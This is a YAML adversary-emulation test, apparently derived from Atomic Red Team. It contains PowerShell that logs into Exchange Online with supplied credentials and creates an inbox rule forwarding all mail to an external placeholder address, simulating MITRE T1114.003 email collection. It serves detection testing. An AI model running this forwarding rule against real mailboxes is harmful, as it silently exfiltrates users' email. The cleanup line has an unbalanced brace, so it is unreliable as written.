api_version: "2.0"
name: Office365 - Email Forwarding
description: |
    Creates a new Inbox Rule to forward emails to an external user via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.
args:
    - name: forwarding_email
      type: string
      default: Atomic_Operator@fakeemail.aq
    - name: username
      type: string
      default: <nil>
    - name: password
      type: string
      default: <nil>
    - name: rule_name
      type: string
      default: Atomic Red Team Email Rule
uuid: 3234117e-151d-4254-9150-3d0bac41e38c
mitre:
    tactics:
        - 'TA0009: Collection'
    techniques:
        - 'T1114: Email Collection'
    subtechniques:
        - 'T1114.003: Email Forwarding Rule'
requirements:
    platforms:
        - os: office-365
steps:
    - name: "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n"
      inline: "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {{Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n}}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n"
      executor: powershell
    - name: office365---email-forwarding
      inline: |
        $secure_pwd = "{{.Args.password}}" | ConvertTo-SecureString -AsPlainText -Force
        $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $secure_pwd
        Connect-ExchangeOnline -Credential $creds
        New-InboxRule -Name "{{.Args.rule_name}}" -ForwardTo "{{.Args.forwarding_email}}"
      executor: powershell
      cleanup:
        inline: |
            $secure_pwd = "{{.Args.password}}" | ConvertTo-SecureString -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $secure_pwd
            Connect-ExchangeOnline -Credential $creds
            Get-InboxRule | Where-Object { $_.Name -eq "{{.Args.rule_name}}" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
        executor: powershell
